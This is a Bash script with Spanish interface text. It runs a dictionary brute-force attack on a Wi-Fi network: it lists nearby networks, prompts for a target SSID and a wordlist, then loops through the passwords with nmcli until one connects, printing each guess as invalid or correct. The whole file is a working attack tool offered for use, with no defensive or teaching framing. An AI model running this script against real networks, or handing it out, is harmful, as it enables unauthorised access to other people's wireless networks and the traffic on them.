
#!/bin/bash
x99=/dev/null
DEFAULT="\033[0;37m"
WHITE="\033[1;37m"
GREEN="\033[1;32m"
RED="\033[1;31m"

killall nm-applet
clear
n=1
nmcli device wifi

echo -e -n "\n${GREEN} [*]${DEFAULT} SSID DEL WIFI ->${GREEN} "
read ssid
echo -e -n " ${GREEN}[*]${DEFAULT} RUTA DEL DICCIONARIO -> ${GREEN}"
read wordlist

echo -e "\n [*]${DEFAULT} Atacando -> ${GREEN}[${ssid}]"
cat "$wordlist" | while read password; do
 nmcli -w 1 device wifi connect "$ssid" password "$password" 2>$x99 >$x99
 while true;do
 	comprobar=`nmcli device status | grep -w 'wifi' | head -n 1 | while read z; do set -- $z ; echo "$3" ;done`
 	if [ "$comprobar" = "disconnected" ];then
 		echo -e " ${RED}[$n] ${DEFAULT}(INTENTO) ->${RED} [-]${WHITE} [${password}] ${RED}[clave invalida]" 
 		break
 	elif [ "$comprobar" = "connected" ];then 
 		echo -e " ${GREEN}[$n] ${DEFAULT}(INTENTO) ->${GREEN} [-]${WHITE} [${password}] ${GREEN}[clave correcta]" 
 		nm-applet &
 	 exit
  fi
  sleep 2
 done
 ((n=$n+1))
done


